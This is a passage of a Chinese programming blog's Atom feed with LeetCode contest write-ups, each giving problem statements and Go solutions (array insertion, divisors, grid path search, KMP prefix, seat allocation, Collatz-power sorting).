<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wywwzjj&#39;s Blog</title>
  
  <subtitle>爱学习，爱分享，爱生活</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://wywwzjj.top/"/>
  <updated>2020-03-22T11:25:53.473Z</updated>
  <id>https://wywwzjj.top/</id>
  
  <author>
    <name>wywwzjj</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>LeetCode Weekly Contest 181</title>
    <link href="https://wywwzjj.top/2020/03/22/LeetCode-Weekly-Contest-181/"/>
    <id>https://wywwzjj.top/2020/03/22/LeetCode-Weekly-Contest-181/</id>
    <published>2020-03-22T04:20:39.000Z</published>
    <updated>2020-03-22T11:25:53.473Z</updated>
    
    <content type="html"><![CDATA[<p>总感觉周赛越来越水了，也许是题目的数据量比较小，所以不需要什么优化，简单模拟就能做出来。</p><h2 id="按既定顺序创建目标数组"><a href="#按既定顺序创建目标数组" class="headerlink" title="按既定顺序创建目标数组"></a><a href="https://leetcode-cn.com/problems/create-target-array-in-the-given-order/" target="_blank" rel="noopener">按既定顺序创建目标数组</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你两个整数数组 <code>nums</code> 和 <code>index</code>。你需要按照以下规则创建目标数组：</p><p>目标数组 <code>target</code> 最初为空。</p><p>按从左到右的顺序依次读取 <code>nums[i]</code> 和 <code>index[i]</code>，在 <code>target</code> 数组中的下标 <code>index[i]</code> 处插入值 <code>nums[i]</code> 。</p><p>重复上一步，直到在 <code>nums</code> 和 <code>index</code> 中都没有要读取的元素。</p><p>请你返回目标数组。</p><p>题目保证数字插入位置总是存在。</p><p><strong>示例 1：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums = [0,1,2,3,4], index = [0,1,2,2,1]</span><br><span class="line">输出：[0,4,1,3,2]</span><br><span class="line">解释：</span><br><span class="line">nums       index     target</span><br><span class="line">0            0        [0]</span><br><span class="line">1            1        [0,1]</span><br><span class="line">2            2        [0,1,2]</span><br><span class="line">3            2        [0,1,3,2]</span><br><span class="line">4            1        [0,4,1,3,2]</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3,4,0], index = [0,1,2,3,0]</span><br><span class="line">输出：[0,1,2,3,4]</span><br><span class="line">解释：</span><br><span class="line">nums       index     target</span><br><span class="line">1            0        [1]</span><br><span class="line">2            1        [1,2]</span><br><span class="line">3            2        [1,2,3]</span><br><span class="line">4            3        [1,2,3,4]</span><br><span class="line">0            0        [0,1,2,3,4]</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;= nums.length, index.length &lt;= 100</span><br><span class="line">nums.length == index.length</span><br><span class="line">0 &lt;= nums[i] &lt;= 100</span><br><span class="line">0 &lt;= index[i] &lt;= i</span><br></pre></td></tr></table></figure><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>数据量小，随便怎么做都行，直接模拟一下。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createTargetArray</span><span class="params">(nums []<span class="keyword">int</span>, index []<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    target := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="built_in">len</span>(nums))</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> target &#123;</span><br><span class="line">        target[i] = <span class="number">-1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(nums); i++ &#123;</span><br><span class="line">        cur := index[i]</span><br><span class="line">        <span class="keyword">if</span> target[cur] != <span class="number">-1</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> j := i - <span class="number">1</span>; j &gt;= cur; j-- &#123;</span><br><span class="line">                target[j], target[j+<span class="number">1</span>] = target[j+<span class="number">1</span>], target[j]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        target[cur] = nums[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四因数"><a href="#四因数" class="headerlink" title="四因数"></a><a href="https://leetcode-cn.com/problems/four-divisors/" target="_blank" rel="noopener">四因数</a></h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你一个整数数组 <code>nums</code>，请你返回该数组中恰有四个因数的这些整数的各因数之和。</p><p>如果数组中不存在满足题意的整数，则返回 0 。</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums = [21,4,7]</span><br><span class="line">输出：32</span><br><span class="line">解释：</span><br><span class="line">21 有 4 个因数：1, 3, 7, 21</span><br><span class="line">4 有 3 个因数：1, 2, 4</span><br><span class="line">7 有 2 个因数：1, 7</span><br><span class="line">答案仅为 21 的所有因数的和。</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;= nums.length &lt;= 10^4</span><br><span class="line">1 &lt;= nums[i] &lt;= 10^5</span><br></pre></td></tr></table></figure><h3 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h3><p>需要注意的是，这里的因数指的是分成两个因子，而不是所有因子，那就很简单了。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sumFourDivisors</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    divisors := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>][]<span class="keyword">int</span>)</span><br><span class="line">    <span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">        <span class="keyword">if</span> _, ok := divisors[num]; ok &#123;  <span class="comment">// nums 出现了重复的</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= <span class="keyword">int</span>(math.Sqrt(<span class="keyword">float64</span>(num))); j++ &#123;</span><br><span class="line">            <span class="keyword">if</span> num%j == <span class="number">0</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> j == num/j &#123;</span><br><span class="line">                    divisors[num] = <span class="built_in">append</span>(divisors[num], j)</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    divisors[num] = <span class="built_in">append</span>(divisors[num], j, num/j)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(divisors[num]) == <span class="number">4</span> &#123;</span><br><span class="line">            ans += divisors[num][<span class="number">0</span>] + divisors[num][<span class="number">1</span>] + divisors[num][<span class="number">2</span>] + divisors[num][<span class="number">3</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="检查网格中是否存在有效路径"><a href="#检查网格中是否存在有效路径" class="headerlink" title="检查网格中是否存在有效路径"></a><a href="https://leetcode-cn.com/problems/check-if-there-is-a-valid-path-in-a-grid/" target="_blank" rel="noopener">检查网格中是否存在有效路径</a></h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你一个 m x n 的网格 <code>grid</code>。网格里的每个单元都代表一条街道。<code>grid[i][j]</code> 的街道可以是：</p><p>1 表示连接左单元格和右单元格的街道。<br>2 表示连接上单元格和下单元格的街道。<br>3 表示连接左单元格和下单元格的街道。<br>4 表示连接右单元格和下单元格的街道。<br>5 表示连接左单元格和上单元格的街道。<br>6 表示连接右单元格和上单元格的街道。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gd2nk21adaj20ds0legm3.jpg" alt="image.png"></p><p>你最开始从左上角的单元格 (0,0) 开始出发，网格中的「有效路径」是指从左上方的单元格 (0,0) 开始、一直到右下方的 (m-1,n-1) 结束的路径。该路径必须只沿着街道走。</p><p>注意：你 <strong>不能</strong> 变更街道。</p><p>如果网格中存在有效的路径，则返回 true，否则返回 false 。</p><p><strong>示例 1：</strong></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gd2nn0s2jsj20f60adweo.jpg" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid = [[2,4,3],[6,5,2]]</span><br><span class="line">输出：true</span><br><span class="line">解释：如图所示，你可以从 (0, 0) 开始，访问网格中的所有单元格并到达 (m - 1, n - 1) 。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gd2no1zdjpj20fr0a1glp.jpg" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid = [[1,2,1],[1,2,1]]</span><br><span class="line">输出：false</span><br><span class="line">解释：如图所示，单元格 (0, 0) 上的街道没有与任何其他单元格上的街道相连，你只会停在 (0, 0) 处。</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid = [[1,1,2]]</span><br><span class="line">输出：false</span><br><span class="line">解释：你会停在 (0, 1)，而且无法到达 (0, 2) 。</span><br></pre></td></tr></table></figure><p><strong>示例 4：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid = [[1,1,1,1,1,1,3]]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure><p><strong>示例 5：</strong></p><p>输入：grid = [[2],[2],[2],[2],[2],[2],[6]]<br>输出：true</p><p><strong>提示：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m == grid.length</span><br><span class="line">n == grid[i].length</span><br><span class="line">1 &lt;= m, n &lt;= 300</span><br><span class="line">1 &lt;= grid[i][j] &lt;= 6</span><br></pre></td></tr></table></figure><h3 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h3><p>将这六种街道转换成 3 * 3 的方格，就变成了普通的迷宫问题，深搜广搜都行。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hasValidPath</span><span class="params">(grid [][]<span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    m, n := <span class="built_in">len</span>(grid)*<span class="number">3</span>, <span class="built_in">len</span>(grid[<span class="number">0</span>])*<span class="number">3</span></span><br><span class="line">    newGrid := <span class="built_in">make</span>([][]<span class="keyword">bool</span>, m)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> newGrid &#123;</span><br><span class="line">        newGrid[i] = <span class="built_in">make</span>([]<span class="keyword">bool</span>, n)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> grid &#123;  <span class="comment">// i 行 j 列</span></span><br><span class="line">        <span class="keyword">for</span> j := <span class="keyword">range</span> grid[i] &#123;</span><br><span class="line">            x, y := <span class="number">3</span>*j, <span class="number">3</span>*i  <span class="comment">// y 行 x 列</span></span><br><span class="line">            newGrid[y+<span class="number">1</span>][x+<span class="number">1</span>] = <span class="literal">true</span></span><br><span class="line">            <span class="keyword">switch</span> grid[i][j] &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                newGrid[y+<span class="number">1</span>][x] = <span class="literal">true</span></span><br><span class="line">                newGrid[y+<span class="number">1</span>][x+<span class="number">2</span>] = <span class="literal">true</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                newGrid[y][x+<span class="number">1</span>] = <span class="literal">true</span></span><br><span class="line">                newGrid[y+<span class="number">2</span>][x+<span class="number">1</span>] = <span class="literal">true</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                newGrid[y+<span class="number">1</span>][x] = <span class="literal">true</span></span><br><span class="line">                newGrid[y+<span class="number">2</span>][x+<span class="number">1</span>] = <span class="literal">true</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                newGrid[y+<span class="number">1</span>][x+<span class="number">2</span>] = <span class="literal">true</span></span><br><span class="line">                newGrid[y+<span class="number">2</span>][x+<span class="number">1</span>] = <span class="literal">true</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                newGrid[y+<span class="number">1</span>][x] = <span class="literal">true</span></span><br><span class="line">                newGrid[y][x+<span class="number">1</span>] = <span class="literal">true</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                newGrid[y][x+<span class="number">1</span>] = <span class="literal">true</span></span><br><span class="line">                newGrid[y+<span class="number">1</span>][x+<span class="number">2</span>] = <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dfs(<span class="number">1</span>, <span class="number">1</span>, m, n, newGrid) <span class="comment">// 注意起点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dfs</span><span class="params">(i, j, m, n <span class="keyword">int</span>, grid [][]<span class="keyword">bool</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> i == m<span class="number">-1</span> &amp;&amp; j == n<span class="number">-2</span> &#123; <span class="comment">// 终点</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || !grid[i][j] &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    grid[i][j] = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">return</span> dfs(i<span class="number">-1</span>, j, m, n, grid) || dfs(i, j<span class="number">-1</span>, m, n, grid) ||</span><br><span class="line">        dfs(i+<span class="number">1</span>, j, m, n, grid) || dfs(i, j+<span class="number">1</span>, m, n, grid)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最长快乐前缀"><a href="#最长快乐前缀" class="headerlink" title="最长快乐前缀"></a><a href="https://leetcode-cn.com/problems/longest-happy-prefix/" target="_blank" rel="noopener">最长快乐前缀</a></h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>「快乐前缀」是在原字符串中既是 <strong>非空</strong> 前缀也是后缀（不包括原字符串自身）的字符串。</p><p>给你一个字符串 <code>s</code>，请你返回它的 <strong>最长快乐前缀</strong>。</p><p>如果不存在满足题意的前缀，则返回一个空字符串。</p><p><strong>示例 1：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;level&quot;</span><br><span class="line">输出：&quot;l&quot;</span><br><span class="line">解释：不包括 s 自己，一共有 4 个前缀（&quot;l&quot;, &quot;le&quot;, &quot;lev&quot;, &quot;leve&quot;）和 4 个后缀（&quot;l&quot;, &quot;el&quot;, &quot;vel&quot;, &quot;evel&quot;）。最长的既是前缀也是后缀的字符串是 &quot;l&quot; 。</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;ababab&quot;</span><br><span class="line">输出：&quot;abab&quot;</span><br><span class="line">解释：&quot;abab&quot; 是最长的既是前缀也是后缀的字符串。题目允许前后缀在原字符串中重叠。</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;leetcodeleet&quot;</span><br><span class="line">输出：&quot;leet&quot;</span><br></pre></td></tr></table></figure><p><strong>示例 4：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;a&quot;</span><br><span class="line">输出：&quot;&quot;</span><br></pre></td></tr></table></figure><p><strong>提示：</strong></p><ul><li><code>1 &lt;= s.length &lt;= 10^5</code></li><li><code>s</code> 只含有小写英文字母</li></ul><h3 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h3><p>标为困难有点名过其实了，这题本质上就是 KMP 算法中的 Next table，看到有人暴力哈希也过了。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">longestPrefix</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    n, k, j := <span class="built_in">len</span>(s), <span class="number">-1</span>, <span class="number">0</span></span><br><span class="line">    next := <span class="built_in">make</span>([]<span class="keyword">int</span>, n+<span class="number">1</span>)</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span></span><br><span class="line">    <span class="keyword">for</span> j &lt; n &#123;</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">-1</span> || s[j] == s[k] &#123;</span><br><span class="line">            k++</span><br><span class="line">            j++</span><br><span class="line">            next[j] = k</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            k = next[k]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s[:next[n]]  <span class="comment">// 注意是 n，假设末尾加一个字符</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;总感觉周赛越来越水了，也许是题目的数据量比较小，所以不需要什么优化，简单模拟就能做出来。&lt;/p&gt;
&lt;h2 id=&quot;按既定顺序创建目标数组&quot;&gt;&lt;a href=&quot;#按既定顺序创建目标数组&quot; class=&quot;headerlink&quot; title=&quot;按既定顺序创建目标数组&quot;&gt;&lt;/a&gt;&lt;
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode Weekly Contest 22（双周赛）</title>
    <link href="https://wywwzjj.top/2020/03/22/LeetCode-Weekly-Contest-22/"/>
    <id>https://wywwzjj.top/2020/03/22/LeetCode-Weekly-Contest-22/</id>
    <published>2020-03-21T16:18:38.000Z</published>
    <updated>2020-03-22T12:15:01.226Z</updated>
    
    <content type="html"><![CDATA[<p>总的来说题目挺简单的。晚上做题注意力没那么集中，看错几次题，浪费不少时间，可惜了。</p><h2 id="两个数组间的距离值"><a href="#两个数组间的距离值" class="headerlink" title="两个数组间的距离值"></a><a href="https://leetcode-cn.com/problems/find-the-distance-value-between-two-arrays/" target="_blank" rel="noopener">两个数组间的距离值</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>给你两个整数数组 arr1 ， arr2 和一个整数 d ，请你返回两个数组之间的距离值 。</p><p>距离值定义为符合此描述的元素数目：对于元素 arr1[i] ，不存在任何元素 arr2[j] 满足 <code>|arr1[i]-arr2[j]| &lt;= d</code> 。</p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>两重循环遍历一下就行。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findTheDistanceValue</span><span class="params">(arr1 []<span class="keyword">int</span>, arr2 []<span class="keyword">int</span>, d <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    ans := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> arr1 &#123;</span><br><span class="line">        flag := <span class="literal">true</span></span><br><span class="line">        <span class="keyword">for</span> j := <span class="keyword">range</span> arr2 &#123;</span><br><span class="line">            <span class="keyword">if</span> abs(arr1[i]-arr2[j]) &lt;= d &#123;</span><br><span class="line">                flag = <span class="literal">false</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> flag &#123;</span><br><span class="line">            ans++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">abs</span><span class="params">(x <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -x</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="安排电影院座位"><a href="#安排电影院座位" class="headerlink" title="安排电影院座位"></a><a href="https://leetcode-cn.com/problems/cinema-seat-allocation/" target="_blank" rel="noopener">安排电影院座位</a></h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>如上图所示，电影院的观影厅中有 n 行座位，行编号从 1 到 n ，且每一行内总共有 10 个座位，列编号从 1 到 10 </p><p>给你数组 <code>reservedSeats</code>，包含所有已经被预约了的座位。比如说，<code>researvedSeats[i] = [3,8]</code> ，它表示第 3 行第 8 个座位被预约了。</p><p>请你返回最多能安排多少个 4 人家庭 。4 人家庭要占据 同一行内连续 的 4 个座位。隔着过道的座位（比方说 [3,3] 和 [3,4]）不是连续的座位，但是如果你可以将 4 人家庭拆成过道两边各坐 2 人，这样子是允许的。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gd225leukoj20nd06bwev.jpg" alt="image.png"></p><p><strong>提示：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;= n &lt;= 10^9</span><br><span class="line">1 &lt;= reservedSeats.length &lt;= min(10*n, 10^4)</span><br><span class="line">reservedSeats[i].length == 2</span><br><span class="line">1 &lt;= reservedSeats[i][0] &lt;= n</span><br><span class="line">1 &lt;= reservedSeats[i][1] &lt;= 10</span><br><span class="line">所有 reservedSeats[i] 都是互不相同的。</span><br></pre></td></tr></table></figure><h3 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h3><p>由于限制了跨过道的坐法只能有一种，即每边坐两人，所以每一排座位的坐法就只有 4 种情况。</p><ul><li>4、5、6、7</li><li>2、3、4、5</li><li>6、7、8、9</li><li>2、3、4、5 和 6、7、8、9</li></ul><p>题目求的是最多能安排多少个家庭座位，所以第四种优先安排。</p><p>剩下的难点在于数据量比较大，如果直接遍历 n 是会超时的。</p><p>注意到 <code>reservedSeats.length &lt;= min(10*n, 10^4)</code>，范围比较小，就从这下手。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxNumberOfFamilies</span><span class="params">(n <span class="keyword">int</span>, reservedSeats [][]<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>][]<span class="keyword">bool</span>)</span><br><span class="line">    <span class="keyword">for</span> _, reservedSeat := <span class="keyword">range</span> reservedSeats &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(m[reservedSeat[<span class="number">0</span>]]) == <span class="number">0</span> &#123;</span><br><span class="line">            m[reservedSeat[<span class="number">0</span>]] = <span class="built_in">make</span>([]<span class="keyword">bool</span>, <span class="number">11</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        m[reservedSeat[<span class="number">0</span>]][reservedSeat[<span class="number">1</span>]] = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    ans := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, isSeat := <span class="keyword">range</span> m &#123;  <span class="comment">// 只关注有座位被占用的部分，整排为空的一定能坐下两家庭</span></span><br><span class="line">        <span class="keyword">if</span> isSeat[<span class="number">2</span>] || isSeat[<span class="number">3</span>] || isSeat[<span class="number">8</span>] || isSeat[<span class="number">9</span>] &#123;</span><br><span class="line">            <span class="keyword">if</span> !isSeat[<span class="number">4</span>] &amp;&amp; !isSeat[<span class="number">5</span>] &amp;&amp; !isSeat[<span class="number">6</span>] &amp;&amp; !isSeat[<span class="number">7</span>] &#123;</span><br><span class="line">                ans++</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> !isSeat[<span class="number">2</span>] &amp;&amp; !isSeat[<span class="number">3</span>] &amp;&amp; !isSeat[<span class="number">4</span>] &amp;&amp; !isSeat[<span class="number">5</span>] &#123;</span><br><span class="line">            ans++</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> !isSeat[<span class="number">6</span>] &amp;&amp; !isSeat[<span class="number">7</span>] &amp;&amp; !isSeat[<span class="number">8</span>] &amp;&amp; !isSeat[<span class="number">9</span>] &#123;</span><br><span class="line">            ans++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>*(n-<span class="built_in">len</span>(m)) + ans  <span class="comment">// 空座位一定能坐下两个家庭</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一种思路，每个座位只有被占用 / 空两种状态，很容易想到用位运算处理。</p><h2 id="将整数按权重排序"><a href="#将整数按权重排序" class="headerlink" title="将整数按权重排序"></a><a href="https://leetcode-cn.com/problems/sort-integers-by-the-power-value/" target="_blank" rel="noopener">将整数按权重排序</a></h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>我们将整数 x 的 权重 定义为按照下述规则将 x 变成 1 所需要的步数：</p><p>如果 x 是偶数，那么 x = x / 2<br>如果 x 是奇数，那么 x = 3 * x + 1</p><p>比方说，x=3 的权重为 7 。因为 3 需要 7 步变成 1 （3 –&gt; 10 –&gt; 5 –&gt; 16 –&gt; 8 –&gt; 4 –&gt; 2 –&gt; 1）。</p><p>给你三个整数 lo， hi 和 k 。你的任务是将区间 [lo, hi] 之间的整数按照它们的权重 升序排序 ，如果大于等于 2 个整数有 相同 的权重，那么按照数字自身的数值 升序排序 。</p><p>请你返回区间 [lo, hi] 之间的整数按权重排序后的第 k 个数。</p><p>注意，题目保证对于任意整数 x （lo &lt;= x &lt;= hi） ，它变成 1 所需要的步数是一个 32 位有符号整数。</p><p><strong>提示：</strong></p><ul><li><code>1 &lt;= lo &lt;= hi &lt;= 1000</code></li><li><code>1 &lt;= k &lt;= hi - lo + 1</code></li></ul><h3 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h3><p>一开始纠结了一会求权重，后面发现直接模拟就好了，并不是每次决策，求最小步数。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getKth</span><span class="params">(lo, hi, k <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    power := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line">    arr := <span class="built_in">make</span>([]<span class="keyword">int</span>, hi-lo+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i := lo; i &lt;= hi; i++ &#123;</span><br><span class="line">        arr[i-lo] = i</span><br><span class="line">        getPower(i, power)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 到这里就变成了常规 Top K 问题，简单做下排序吧，注意要稳定排序</span></span><br><span class="line">    sort.Slice(arr, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="keyword">int</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> power[arr[i]] != power[arr[j]] &#123;</span><br><span class="line">            <span class="keyword">return</span> power[arr[i]] &lt; power[arr[j]]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr[i] &lt; arr[j] <span class="comment">// 相等的留在原地</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> arr[k<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getPower</span><span class="params">(x <span class="keyword">int</span>, power <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    ans, tmp := <span class="number">0</span>, x</span><br><span class="line">    <span class="keyword">for</span> x != <span class="number">1</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> x&amp;<span class="number">1</span> == <span class="number">1</span> &#123;</span><br><span class="line">            x = <span class="number">3</span>*x + <span class="number">1</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            x /= <span class="number">2</span></span><br><span class="line">        &#125;</span><br><span class="line">        ans++</span><br><span class="line">        <span class="keyword">if</span> val, ok := power[x]; ok &#123;</span><br><span class="line">            ans += val</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    power[tmp] = ans</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3n-块披萨"><a 